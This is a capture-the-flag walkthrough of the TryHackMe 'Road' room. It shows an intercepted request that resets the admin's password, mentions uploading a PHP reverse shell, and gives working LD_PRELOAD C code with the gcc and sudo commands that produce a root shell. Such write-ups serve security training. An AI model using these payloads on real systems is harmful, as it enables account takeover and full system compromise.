# Road
[TryHackMe room link](https://tryhackme.com/room/road)

# Informations about the room

> As usual, obtain the user and root flag.

# Open ports 

22 OpenSSH 8.2p1

80 Apache/2.4.41


# Enumeration

Gobuster finds a `v2` directory that contains a login

We create an account and we start to explore the website

It's possible to change the account's profile picture but right now is reserved to admins only

We have a password reset form

The username is not changeble, but we can intercept the request made and change the username to the admin's one

```console
POST /v2/lostpassword.php HTTP/1.1
Host: skycouriers.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------48107381021115354291199842422
Content-Length: 646
Origin: http://skycouriers.com
Connection: close
Referer: http://skycouriers.com/v2/ResetUser.php
Cookie: PHPSESSID=2mmnhv18lmdvgj1661dc2b70fa; Bookings=0; Manifest=0; Pickup=0; Delivered=0; Delay=0; CODINR=0; POD=0; cu=0
Upgrade-Insecure-Requests: 1

-----------------------------48107381021115354291199842422
Content-Disposition: form-data; name="uname"

admin@sky.thm
-----------------------------48107381021115354291199842422
Content-Disposition: form-data; name="npass"

1234
-----------------------------48107381021115354291199842422
Content-Disposition: form-data; name="cpass"

1234
-----------------------------48107381021115354291199842422
Content-Disposition: form-data; name="ci_csrf_token"


-----------------------------48107381021115354291199842422
Content-Disposition: form-data; name="send"

Submit
-----------------------------48107381021115354291199842422--

```

We now have access to the admin account

We use the profile picture upload functionality and we upload a php reverse shell

# Privilege escalation

We are now user `www-data` 

Linpeas showed us that MongoDB is running


```
> db.user.find()
{ "_id" : ObjectId("60ae2661203d21857b184a76"), "Month" : "Feb", "Profit" : "25000" }
{ "_id" : ObjectId("60ae2677203d21857b184a77"), "Month" : "March", "Profit" : "5000" }
{ "_id" : ObjectId("60ae2690203d21857b184a78"), "Name" : "webdeveloper", "Pass" : "REDACTED" }
{ "_id" : ObjectId("60ae26bf203d21857b184a79"), "Name" : "Rohit", "EndDate" : "December" }
{ "_id" : ObjectId("60ae26d2203d21857b184a7a"), "Name" : "Rohit", "Salary" : "30000" }
```

We got `webdeveloper`'s user password


With `sudo -l` we can see that this user can run a binary with `sudo`:

```console
Matching Defaults entries for webdeveloper on sky:                                                                                                                                           
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD                                                  
                                                                                                                                                                                             
User webdeveloper may run the following commands on sky:                                                                                                                                     
    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility  
```

There is also [LD_PRELOAD](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path)

That is a variable that contains the path of shared libraries or object that will be executed before any other shared library 

We can write code that spawns a root shell when running the `sky_backup_utility` binary

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```console
webdeveloper@sky:/dev/shm$ gcc -fPIC -shared -o test.so test.c -nostartfiles
webdeveloper@sky:/dev/shm$ sudo LD_PRELOAD=./test.so sky_backup_utility 
root@sky:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root)
root@sky:/dev/shm# 
```
